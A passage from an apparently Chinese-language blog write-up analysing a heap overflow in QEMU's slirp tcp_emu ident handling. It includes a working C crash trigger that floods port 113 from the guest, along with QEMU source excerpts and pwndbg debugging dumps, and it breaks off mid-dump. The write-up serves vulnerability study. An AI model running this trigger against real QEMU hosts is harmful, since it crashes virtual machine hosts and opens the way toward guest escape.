class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-m 2G -nographic \</span><br><span class="line">-net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure><p>这里使用<code>hostfwd</code>进行了端口转发，即将本机的<code>2222</code>端口转发到<code>qemu</code>虚拟机的<code>22</code>端口。因此我们向虚拟机中传输文件可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i ./ssh/id_rsa -P2222 ./file root@localhost:/</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们先测试一下环境，将<code>exp</code>编译完毕之后传入到<code>qemu</code>虚拟机中执行，同时在本机监听端口<code>nc -lvknp 113</code>，<code>exp</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.0.2.2&quot;</span>); <span class="comment">// host IP</span></span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>);                   <span class="comment">// vulnerable port</span></span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        write(s, buf, <span class="number">0x500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行之后<code>qemu</code>崩溃。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ./exp</span></span><br><span class="line">connect res 0</span><br><span class="line">start.sh: line 7:   265 Segmentation fault      ./qemu-system-x86_64 -L pc-bios -kernel ./bzImage c</span><br></pre></td></tr></table></figure><p>注意的是这里的程序使用一次之后再次使用就不行了，不知道为什么，因此调试一次就需要重新拷贝一次。根据<a href="https://github.com/Kira-cxy/qemu-vm-escape/blob/master/writeup_zh.md">writeup</a>，这里我们将断点设置在<code>tcp_emu</code>函数处。可以看到调用的堆栈如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>     <span class="number">5570</span>c2d68d2d tcp_emu+<span class="number">28</span></span><br><span class="line">  f <span class="number">1</span>     <span class="number">5570</span>c2d651d9 tcp_input+<span class="number">3189</span></span><br><span class="line">  f <span class="number">2</span>     <span class="number">5570</span>c2d5bee4 ip_input+<span class="number">710</span></span><br><span class="line">  f <span class="number">3</span>     <span class="number">5570</span>c2d5f435 slirp_input+<span class="number">412</span></span><br><span class="line">  f <span class="number">4</span>     <span class="number">5570</span>c2d47669 net_slirp_receive+<span class="number">83</span></span><br><span class="line">  f <span class="number">5</span>     <span class="number">5570</span>c2d3d043 nc_sendv_compat+<span class="number">254</span></span><br><span class="line">  f <span class="number">6</span>     <span class="number">5570</span>c2d3d105 qemu_deliver_packet_iov+<span class="number">172</span></span><br><span class="line">  f <span class="number">7</span>     <span class="number">5570</span>c2d3fcbe qemu_net_queue_deliver_iov+<span class="number">80</span></span><br><span class="line">  f <span class="number">8</span>     <span class="number">5570</span>c2d3fe2d qemu_net_queue_send_iov+<span class="number">134</span></span><br><span class="line">  f <span class="number">9</span>     <span class="number">5570</span>c2d3d24a qemu_sendv_packet_async+<span class="number">289</span></span><br><span class="line">  f <span class="number">10</span>     <span class="number">5570</span>c2d3d277 qemu_sendv_packet+<span class="number">43</span></span><br></pre></td></tr></table></figure><p>结合源码调试可以发现该函数的实现位于<code>/slirp/tcp_subr.c</code>处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">  <span class="title function_">tcp_emu</span><span class="params">(<span class="keyword">struct</span> socket *so, <span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">  Slirp *slirp = so-&gt;slirp;</span><br><span class="line">  u_int n1, n2, n3, n4, n5, n6;</span><br><span class="line">  <span class="type">char</span> buff[<span class="number">257</span>];</span><br><span class="line">  <span class="type">uint32_t</span> laddr;</span><br><span class="line">  u_int lport;</span><br><span class="line">  <span class="type">char</span> *bptr;</span><br><span class="line"></span><br><span class="line">  DEBUG_CALL(<span class="string">&quot;tcp_emu&quot;</span>);</span><br><span class="line">  DEBUG_ARG(<span class="string">&quot;so = %p&quot;</span>, so);</span><br><span class="line">  DEBUG_ARG(<span class="string">&quot;m = %p&quot;</span>, m);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">      <span class="type">int</span> x, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        <span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);<span class="comment">// 拷贝数据</span></span><br><span class="line">        so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">        so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">        m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">&#x27;\r&#x27;</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">&#x27;\n&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">&quot;%u%*[ ,]%u&quot;</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">            HTONS(n1);</span><br><span class="line">            HTONS(n2);</span><br><span class="line">            <span class="comment">/* n2 is the one on our host */</span></span><br><span class="line">            <span class="keyword">for</span> (tmpso = slirp-&gt;tcb.so_next;</span><br><span class="line">                 tmpso != &amp;slirp-&gt;tcb;</span><br><span class="line">                 tmpso = tmpso-&gt;so_next) &#123;</span><br><span class="line">              <span class="keyword">if</span> (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_lport == n2 &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_fport == n1) &#123;</span><br><span class="line">                <span class="keyword">if</span> (getsockname(tmpso-&gt;s,</span><br><span class="line">                                (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;addrlen) == <span class="number">0</span>)</span><br><span class="line">                  n2 = ntohs(addr.sin_port);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,</span><br><span class="line">                                   so_rcv-&gt;sb_datalen,</span><br><span class="line">                                   <span class="string">&quot;%d,%d\r\n&quot;</span>, n1, n2);</span><br><span class="line">          so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">          so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">        &#125;</span><br><span class="line">        m_free(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从函数逻辑中我们可以看到，函数首先是将<code>m-&gt;m_data</code>拷贝到<code>so_rcv-&gt;sb_wptr</code>中。<code>so_rcv</code>的数据结构为<code>sbuf</code>用来保存<code>tcp</code>网络层的数据，<code>m</code>的数据结构为<code>mbuf</code>用来保存<code>ip</code>传输层的数据，如果<code>data</code>中包含有<code>\r\n</code>则会对<code>sb_cc</code>进行赋值。我们发送的<code>payload</code>中不含含有<code>\r\n</code>，因此这里不会进行赋值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> sb_cc;<span class="comment">/* actual chars in buffer */</span></span><br><span class="line"><span class="type">uint32_t</span> sb_datalen;<span class="comment">/* Length of data  */</span></span><br><span class="line"><span class="type">char</span>*sb_wptr;<span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment"> * bytes should be written in the sbuf */</span></span><br><span class="line"><span class="type">char</span>*sb_rptr;<span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment"> * byte should be read from the sbuf */</span></span><br><span class="line"><span class="type">char</span>*sb_data;<span class="comment">/* Actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line"><span class="comment">/* XXX should union some of these! */</span></span><br><span class="line"><span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">mbuf</span> *<span class="title">m_next</span>;</span><span class="comment">/* Linked list of mbufs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span><span class="comment">/* Next packet in queue/record */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span><span class="comment">/* Flags aren&#x27;t used in the output queue */</span></span><br><span class="line"><span class="type">int</span>m_flags;<span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>m_size;<span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">caddr_t</span>m_data;<span class="comment">/* Current location of data */</span></span><br><span class="line"><span class="type">int</span>m_len;<span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">Slirp *slirp;</span><br><span class="line"><span class="type">bool</span>resolution_requested;</span><br><span class="line"><span class="type">uint64_t</span> expiration_date;</span><br><span class="line"><span class="type">char</span>   *m_ext;</span><br><span class="line"><span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line"><span class="type">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在进行<code>memcpy</code>数据拷贝之前会进行<code>buf</code>剩余空间大小的判断，我们来看一下<code>tcp_emu</code>函数的调用函数<code>tcp_input</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//slirp/tcp_input.c</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;</span><br><span class="line">         tcpfrag_list_empty(tp) &amp;&amp;</span><br><span class="line">         ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;<span class="comment">// 这里计算了buf的剩余空间大小</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * this is a pure, in-sequence data packet</span></span><br><span class="line"><span class="comment"> * with nothing on the reassembly queue and</span></span><br><span class="line"><span class="comment"> * we have enough buffer space to take it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  tp-&gt;rcv_nxt += ti-&gt;ti_len;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Add data to socket buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">if</span> (so-&gt;so_emu) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    sbappend(so, m);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is a short packet, then ACK now - with Nagel</span></span><br><span class="line"><span class="comment"> *congestion avoidance sender won&#x27;t send more until</span></span><br><span class="line"><span class="comment"> *he gets an ACK.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It is better to not delay acks at all to maximize</span></span><br><span class="line"><span class="comment"> * TCP throughput.  See RFC 2581.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  tp-&gt;t_flags |= TF_ACKNOW;</span><br><span class="line">  tcp_output(tp);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>ti</code>的结构体是<code>tcpiphdr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpiphdr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf_ptr</span> <span class="title">ih_mbuf</span>;</span><span class="comment">/* backpointer to mbuf */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_src</span>;</span> <span class="comment">/* source internet address */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_dst</span>;</span> <span class="comment">/* destination internet address */</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_x1;          <span class="comment">/* (unused) */</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_pr;          <span class="comment">/* protocol */</span></span><br><span class="line">        &#125; ti_i4;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_src</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_dst</span>;</span></span><br><span class="line">            <span class="type">uint8_t</span> ih_x1;</span><br><span class="line">            <span class="type">uint8_t</span> ih_nh;</span><br><span class="line">        &#125; ti_i6;</span><br><span class="line">    &#125; ti;</span><br><span class="line">    <span class="type">uint16_t</span>    ti_x0;</span><br><span class="line">    <span class="type">uint16_t</span>    ti_len;             <span class="comment">/* protocol length */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>      <span class="title">tcphdr</span> <span class="title">ti_t</span>;</span>        <span class="comment">/* tcp header */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>spspace</code>的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)</span></span><br></pre></td></tr></table></figure><p><code>ti_len</code>表示的是协议的长度，因为我们输入的<code>payload</code>中没有<code>\r\n</code>因此这里的<code>sb_cc</code>恒定为<code>0</code>。从<code>tcp_input</code>到<code>tcp_emu</code>函数，显示调用了<code>sbspace</code>函数判断<code>buf</code>的剩余空间的大小是否满足要求，如果满足要求那么就会调用<code>tcp_emu-&gt;memcpy</code>函数进行数据的拷贝。</p><p>但是这里存在一个问题，就是数据拷贝结束之后，如果<code>data</code>中不包含<code>\r or \n</code>字符串，那么就不会对<code>sb_cc</code>进行操作，也就是不会加上拷贝的数据的长度。当用户多次调用<code>tcp_input</code>函数进行数据写入的时候，第二次调用<code>sbspace</code>函数计算得到的<code>data</code>的剩余的空间的大小就不是真正的剩余空间的大小。条件判断恒成立，多次调用<code>memcpy</code>就会导致堆溢出。</p><p>动态调试一下，断点设置在<code>tcp_input</code>的条件判断处和<code>tcp_emu</code>的<code>memcpy</code>处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b tcp_subr.c:<span class="number">638</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x5606efa01da9</span>: file /root/pwn/qemu/qemu/slirp/tcp_subr.c, line <span class="number">638.</span></span><br><span class="line">pwndbg&gt; b tcp_input.c:<span class="number">558</span></span><br><span class="line">Breakpoint <span class="number">2</span> at <span class="number">0x5606ef9fe14c</span>: file /root/pwn/qemu/qemu/slirp/tcp_input.c, line <span class="number">558</span></span><br></pre></td></tr></table></figure><p>第一次断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *ti</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  ih_mbuf = &#123;</span><br><span class="line">    mptr = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ti = &#123;</span><br><span class="line">    ti_i4 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        s_addr = <span class="number">0xf02000a</span></span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        s_addr = <span class="number">0x202000a</span></span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = <span class="number">0x0</span>,</span><br><span class="line">      ih_pr = <span class="number">0x6</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ti_i6 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = &#123;<span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr16 = &#123;<span class="number">0xa</span>, <span class="number">0xf02</span>, <span class="number">0xa</span>, <span class="number">0x202</span>, <span class="number">0x600</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr32 = &#123;<span class="number">0xf02000a</span>, <span class="number">0x202000a</span>, <span class="number">0x600</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;,</span><br><span class="line">          __u6_addr16 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">          __u6_addr32 = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = <span class="number">0x0</span>,</span><br><span class="line">      ih_nh = <span class="number">0x0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  ti_x0 = <span class="number">0x0</span>,</span><br><span class="line">  ti_len = <span class="number">0x500</span>,</span><br><span class="line">  <span class="type">ti_t</span> = &#123;</span><br><span class="line">    th_sport = <span class="number">0xe897</span>,</span><br><span class="line">    th_dport = <span class="number">0x7100</span>,</span><br><span class="line">    th_seq = <span class="number">0x5c63c5b6</span>,</span><br><span class="line">    th_ack = <span class="number">0x772402</span>,</span><br><span class="line">    th_x2 = <span class="number">0x0</span>,</span><br><span class="line">    th_off = <span class="number">0x5</span>,</span><br><span class="line">    th_flags = <span class="number">0x18</span>,</span><br><span class="line">    th_win = <span class="number">0xfaf0</span>,</span><br><span class="line">    th_sum = <span class="number">0xbb95</span>,</span><br><span class="line">    th_urp = <span class="number">0x0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的<code>ti_len</code>的大小就是我们输入的<code>0x500</code>，再来看一下<code>so-&gt;so_recv</code>的成员变量的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x so-&gt;so_rcv</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0x0</span>,</span><br><span class="line">  sb_datalen = <span class="number">0x2238</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4150f0</span>,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4150f0</span>,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到初始时候的<code>buf</code>大小为<code>0x2238</code>，<code>su_cc</code>为<code>0</code>。<code>memcpy</code>断点执行完毕之后，可以看到我们的数据已经拷贝进入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 